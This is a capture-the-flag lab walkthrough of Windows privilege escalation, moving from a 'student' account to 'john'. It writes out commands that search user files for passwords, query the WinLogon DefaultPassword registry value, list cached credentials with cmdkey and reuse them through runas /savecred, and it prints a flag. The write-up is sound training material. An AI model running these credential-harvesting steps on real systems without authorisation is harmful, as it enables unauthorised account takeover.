---

# Privilege Escalation CTF 1 - Lab Walkthrough

## Overview

This lab focuses on privilege escalation techniques within a Windows environment. The objective is to enumerate the target system, gather credentials, exploit misconfigurations or stored secrets, and ultimately escalate privileges to obtain various flags.

The target machine is a Windows host with multiple users, including one named `john`. The lab simulates real-world post-exploitation scenarios where gaining higher privileges involves careful reconnaissance and leveraging common Windows weaknesses.

---

## Environment Setup

* Windows target machine with limited initial access.
* No internet connectivity on the target.
* Access obtained to user `student` initially.
* Tools used: native Windows commands (`cmd`, `powershell`, `runas`, `cmdkey`), privilege escalation techniques from lab videos and notes.

---

## Steps Taken and Findings

### Initial Enumeration

* **User and Group Information:**

  ```powershell
  whoami /groups
  whoami /priv
  net user john
  ```

  These commands helped identify user privileges and group memberships. The user `john` exists but does not have administrative privileges by default.

* **Credential Discovery:**
  Searched recursively for plaintext credentials or sensitive strings in files:

  ```powershell
  Get-ChildItem -Path C:\Users\ -Recurse -Include *.txt,*.xml,*.ini,*.ps1 -ErrorAction SilentlyContinue | Select-String -Pattern "password","pass","cred","john"
  ```

  No immediate credentials were found in text files.

* **Registry Check for Stored Passwords:**
  Attempted to find the `DefaultPassword` registry entry:

  ```cmd
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultPassword
  ```

  Result: Key not found.

* **Stored Credentials:**
  Used `cmdkey` to list cached credentials:

  ```cmd
  cmdkey /list
  ```

  Found credentials cached for user `john` in the form:

  ```
  Target: Domain:interactive=EC2AMAZ-A251FFF\john
  User: EC2AMAZ-A251FFF\john
  ```

### Credential Usage and User Switching

* Used the cached credentials to launch a command prompt as user `john`:

  ```cmd
  runas.exe /savecred /user:john cmd
  ```

* Verified the current user:

  ```cmd
  whoami
  ```

  Output confirmed successful user switch:

  ```
  ec2amaz-a251fff\john
  ```

* Checked groups and privileges for `john`:

  ```cmd
  whoami /groups
  whoami /priv
  ```

  `john` had no elevated privileges but was a member of `Remote Desktop Users` and `Users`.

### Accessing User Files and Retrieving Flags

* Navigated to `john`'s desktop and accessed a directory containing files:

  ```
  C:\Users\john\Desktop\john-data
  ```
* Listed contents:

  ```cmd
  dir
  ```
* Read the contents of `flag1.txt` using:

  ```cmd
  type flag1.txt
  ```
* Retrieved Flag 1:

  ```
  fa9598968df8452a80267dd377fc77bc
  ```

---

## Summary & Next Steps

* Successfully enumerated user accounts and permissions.
* Leveraged cached credentials with `cmdkey` and `runas` to escalate from `student` to user `john`.
* Retrieved the first flag from user `john`'s desktop.
* Further privilege escalation may involve exploring service permissions, scheduled tasks, or vulnerable software as shown in lab videos.

---

## Commands of Interest

```powershell
Get-ChildItem -Path C:\Users\ -Recurse -Include *.txt,*.xml,*.ini,*.ps1 -ErrorAction SilentlyContinue | Select-String -Pattern "password","pass","cred","john"

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultPassword

cmdkey /list

runas.exe /savecred /user:john cmd

whoami
whoami /groups
whoami /priv

dir C:\Users\john\Desktop\john-data
type C:\Users\john\Desktop\john-data\flag1.txt
```

---

## Conclusion

This lab provided practical experience in Windows privilege escalation using native tools and credential caching mechanisms. Understanding how Windows stores and manages credentials, combined with enumeration and command-line proficiency, allowed access to a higher privilege user and successful flag retrieval.

---
